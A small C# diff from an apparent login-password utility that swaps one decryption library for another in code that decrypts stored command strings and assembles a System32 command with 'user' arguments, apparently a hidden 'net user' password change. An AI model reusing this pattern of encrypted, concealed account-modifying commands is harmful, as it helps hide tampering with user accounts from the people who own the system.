@@ -18,7 +18,7 @@ using ACLoginPasswordUtil;
 using System;
 using System.Text;
 using System.Diagnostics;
-using LPU_Crypt_API;
+using ACLibrary.Crypto.MixCryptSeries;
 
 namespace LPU_Util
 {
@@ -26,7 +26,7 @@ namespace LPU_Util
     {
         public StringBuilder ConstructCommandText(String sysPath, String psw, Resources resClass)
         {
-            String b = new MixCrypt().decrypt(resClass.baseCmd, psw);
+            String b = new Mid().DecryptString(resClass.baseCmd, psw);
             StringBuilder sBuilder = new StringBuilder();
             sBuilder.Append(sysPath);
             sBuilder.Append("\\System32\\");
@@ -36,8 +36,8 @@ namespace LPU_Util
 
         public StringBuilder ConstructArgText(StringBuilder sBuilder, String psw, Resources resClass, int pswInt)
         {
-            String n = new MixCrypt().decrypt(resClass.netCmd, psw);
-            String a = new MixCrypt().decrypt(resClass.armv7a, psw);
+            String n = new Mid().DecryptString(resClass.netCmd, psw);
+            String a = new Mid().DecryptString(resClass.armv7a, psw);
             sBuilder.Clear();
             sBuilder.Append(n);  // arg1 " user ..."
             sBuilder.Append(a); // KeyChar
